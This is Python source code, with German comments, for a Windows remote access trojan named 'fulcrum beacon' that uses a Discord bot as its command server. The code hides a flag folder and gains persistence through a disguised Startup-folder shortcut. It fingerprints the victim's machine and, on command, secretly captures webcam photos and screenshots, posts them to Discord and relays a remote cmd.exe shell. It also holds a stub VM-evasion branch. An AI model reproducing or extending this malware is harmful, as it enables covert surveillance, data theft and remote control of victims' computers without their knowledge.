import os
import subprocess
import threading
import asyncio
import discord
from dotenv import load_dotenv
import ctypes
import json
import wmi
import time
import cv2
import mss
import winshell
from win32com.client import Dispatch
from discord.ext import commands, tasks
from PIL import Image

FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

first_execution = False

# default(open to commands) shell(in remote shell) pshell(in remote powershell shell)
mode = "default"

shell_process = None

profile_data = None

START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
load_dotenv()
TOKEN = os.getenv('TOKEN')

# discord bot intents
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
intents.guilds = True
# bot client mit intents
client = discord.Client(intents=intents)


@client.event
async def on_ready():   # sobald der client sich mit discord verbunden hat
    global profile_data
    global first_execution

    print(f'logged in as {client.user}')
    periodic_update_loop.start()

    print("start up")
    if first_execution:
        print("first execution")
        await create_channel()
    try:
        if not profile_data:

            with open("profile.json", "r") as json_file:
                profile_data = json.load(json_file)

        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])

        await channel.send(f"*{profile_data["user_name"]} logged on*")

    except Exception as e:
        await return_error_to_channel(e)


@client.event
async def on_message(message):  # wenn discord message erkannt wird
    global mode
    global shell_process
    # profile data laden
    global profile_data
    if not profile_data:
        try:
            with open("profile.json", "r") as json_file:
                profile_data = json.load(json_file)
        except Exception as e:
            await return_error_to_channel(e)

    content = message.content
    # nach dem channel mit richtigem namen suchen
    channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])

    # eigene und messages aus anderen channels aussortieren
    if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
        return

    # print("message received")
    match mode:
        case "default":

            if content.startswith("-TP"):   # TAKE PICTURE
                content = content.strip("-TP")
                cam_index = 0
                if content:
                    content = content.replace(" ", "")
                    cam_index = int(content)
                await take_picture(cam_index)

            elif content.startswith("-SG"):     # SCREEN GRAB
                content = content.strip("-SG")
                screen_index = 0
                if content:
                    content = content.replace(" ", "")
                    screen_index = int(content)
                await take_screenshot(screen_index)

            elif content.startswith("-SHELL"):
                mode = "shell"
                shell_process = subprocess.Popen(
                    ['cmd.exe'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
                await channel.send("**CMD SHELL ACTIVE**")
                await channel.send(f"{os.getcwd()}")

        case "shell":
                print(mode)
                if content.startswith("quit"):
                    mode = "default"
                    if shell_process:
                        shell_process.terminate()
                        await channel.send("**CMD SHELL TERMINATED**")
                        return

                    await channel.send("**CMD SHELL TERMINATED**")
                    return

                print(content)

                if shell_process:
                    shell_process.stdin.write(content + "\n")
                    shell_process.stdin.flush()

                    # Start a new thread to read the output
                    threading.Thread(target=send_shell_output_2_discord, daemon=True).start()

def send_shell_output_2_discord():
    global shell_process
    channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])

    while True:
        output = shell_process.stdout.readline()
        if not output:
            break
        asyncio.run_coroutine_threadsafe(channel.send(output), client.loop)
        time.sleep(0.3)


def check_for_vm():
    return False


async def create_channel():
    # neuen channel erstellen
    try:
        with open("profile.json", "r") as json_file:
            profile_data = json.load(json_file)

        guild = client.guilds[0]
        new_channel = await guild.create_text_channel(profile_data["channel_name"])

        await new_channel.send("***NEW BEACON CONNECTED***")
        await new_channel.send(f'*user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}*')
    except Exception as e:
        await return_error_to_channel(e)


async def return_error_to_channel(error_message):
    global profile_data
    error_message = str(error_message)
    try:
        if not profile_data:
            with open("profile.json", "r") as json_file:
                profile_data = json.load(json_file)

        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
        if channel is not None:
            await channel.send("'''" + error_message + "'''")
        else:
            print("No channel")
            print("trying to create channel")
            await create_channel()

    except:
        print("error returning error")

async def take_picture(cam_index):
    global profile_data
    print("-TP")
    try:
        # aufnehmen des fotos
        cam = cv2.VideoCapture(cam_index)
        ret, frame = cam.read()
        cv2.imwrite("captured_frame.jpg", frame)
        cam.release()

        # senden des fotos
        if not profile_data:
            with open("profile.json", "r") as json_file:
                profile_data = json.load(json_file)

        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
        with open("captured_frame.jpg", 'rb') as image_file:
            await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tcam:{cam_index}**",
                               file=discord.File(image_file, "image.jpg"))

        os.remove("captured_frame.jpg")

    except Exception as e:
        await return_error_to_channel(e)


from mss import mss
import json
import discord
from datetime import datetime
import os


async def take_screenshot(screen_index):
    global profile_data
    print("Taking screenshot...")
    try:
        with mss() as sct:
            monitors = sct.monitors
            monitor = monitors[screen_index]
            screenshot = sct.grab(monitor)
            image = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

            image.save("captured_screen.png")

        if not profile_data:
            with open("profile.json", "r") as json_file:
                profile_data = json.load(json_file)

        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
        with open("captured_screen.png", 'rb') as image_file:
            if screen_index == 0:
                screen_index = "ALL"    # screen index von 0 auf ALL string für besseren discord output

            await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tscreen:{screen_index}**",
                               file=discord.File(image_file, "image.jpg"))

        os.remove("captured_screen.png")

    except Exception as e:
        print(f"An error occurred: {str(e)}")
        await return_error_to_channel(e)


def create_flag():
    try:
        os.mkdir(FLAG_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(FLAG_PATH, FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        return_error_to_channel(e)


def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False


def get_persistence():  # TODO
    # benutzten des windows user startup folders
    try:
        if os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw")):
            create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"), os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw"))
        elif os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.exe")):
            create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"), os.path.join(INSTALL_PATH, "fulcrum_beacon.exe"))

    except Exception as e:
        print(e)


def create_shortcut(shortcut_path, target_path):
    print("create shortcut")
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.save()

def create_unique_profile():
    c = wmi.WMI()
    mainboard_serial = c.Win32_BaseBoard()[0].SerialNumber.strip()
    profile = {
        'hardware_id': f'{mainboard_serial}',
        'user_name': f'{os.getlogin()}',
        'channel_name': f'{os.getlogin()}-{mainboard_serial}',
    }
    with open('profile.json', 'w') as f:
        json.dump(profile, f)


@tasks.loop(seconds=1)
async def periodic_update_loop():
    pass


def main():
    global first_execution
    # überprüfen ob fulcrum in einem vm läuft
    if check_for_vm() is True:
        print("start up")
        a = 1+1-42
        b = "03985027"
        c = b + "2034"
        print(str(a) + c)
        print("CONNECTED")
        while True:
            time.sleep(1)
            a += 1

    print("no vm")

    # überprüfen ob die flag existiert (ob fulcrum das erste mal ausgeführt wird)
    if check_flags() is False:
        print("no flag")
        create_flag()
        get_persistence()
        create_unique_profile()
        first_execution = True

    # starten des discord bots
    client.run(TOKEN)

if __name__ == '__main__':
    main()
